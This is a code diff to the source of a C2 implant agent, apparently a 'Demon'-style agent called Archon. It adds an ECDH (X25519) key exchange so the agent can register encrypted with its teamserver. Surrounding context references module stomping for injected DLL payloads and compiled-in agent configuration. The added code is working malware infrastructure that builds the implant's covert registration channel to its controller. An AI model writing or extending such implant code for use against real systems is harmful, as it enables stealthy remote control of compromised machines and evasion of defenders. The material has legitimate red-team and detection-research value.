@@ -24,6 +24,21 @@
 /* ARC-05: module stomping for injected DLL payload */
 #include <inject/ModuleStomp.h>
 
+#ifdef ARCHON_ECDH_MODE
+#include <bcrypt.h>
+
+/* CSPRNG using BCryptGenRandom (FIPS-compliant), NOT RtlRandomEx which is a PRNG. */
+ei_bool ArchonEcdhRng(ei_u8 *buf, ei_size_t len) {
+    NTSTATUS status = BCryptGenRandom(NULL, (PUCHAR)buf, (ULONG)len,
+                                      BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    return status == 0 ? EI_TRUE : EI_FALSE;
+}
+
+/* X25519 listener public key compiled in — the teamserver injects ARCHON_LISTENER_PUBKEY
+ * as a C array initializer (e.g. {0x12,0x34,...}). */
+const ei_u8 ArchonListenerKey[32] = ARCHON_LISTENER_PUBKEY;
+#endif
+
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
 SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
@@ -274,6 +289,49 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
      * packets instead of resetting to block 0 on every transmission.
      * The teamserver will register this agent with legacy_ctr = false. */
     PackageAddInt32( *MetaData, DEMON_INITIALIZE_EXT_MONOTONIC_CTR );
+
+#ifdef ARCHON_ECDH_MODE
+    {
+        /* Build the ECDH registration packet from the metadata that follows the
+         * AES key/IV prefix.  Package layout at this point:
+         *   [0..3]   size placeholder (4 B BE)
+         *   [4..7]   agent_id         (4 B BE)
+         *   [8..11]  magic            (4 B BE)
+         *   [12..15] command_id       (4 B BE)
+         *   [16..19] request_id       (4 B BE)
+         *   [20..51] AES key          (32 B, raw)
+         *   [52..67] AES IV           (16 B, raw)
+         *   [68..]   metadata for parse_ecdh_agent_metadata()
+         * Only the bytes from offset 68 onward are included in the ECDH packet. */
+        const ei_u8   *meta  = (const ei_u8 *)((*MetaData)->Buffer + 68);
+        const ei_size_t mlen = (ei_size_t)((*MetaData)->Length - 68);
+        ei_size_t  pkt_len;
+        ei_u8     *pkt_buf;
+        ei_u64     unix_now;
+
+        if ( mlen <= 4088 ) {
+            pkt_len = 32 + 12 + 8 + mlen + 16;
+            pkt_buf = (ei_u8 *)Instance->Win32.LocalAlloc( LPTR, pkt_len );
+            if ( pkt_buf ) {
+                /* Convert Windows FILETIME (100-ns intervals since 1601-01-01) to
+                 * Unix epoch seconds (seconds since 1970-01-01).
+                 * 0x019DB1DED53E8000 == 116444736000000000 == FILETIME at Unix epoch. */
+                unix_now = (ei_u64)(
+                    ( SharedTimestamp() - 0x019DB1DED53E8000ULL ) / 10000000ULL );
+                if ( ecdh_build_registration_packet(
+                        ArchonListenerKey, meta, mlen,
+                        pkt_buf, &pkt_len,
+                        Instance->ECDH.SessionKey,
+                        ArchonEcdhRng, unix_now ) ) {
+                    Instance->ECDH.RegPacket    = pkt_buf;
+                    Instance->ECDH.RegPacketLen = pkt_len;
+                } else {
+                    Instance->Win32.LocalFree( pkt_buf );
+                }
+            }
+        }
+    }
+#endif
 }
 
 VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
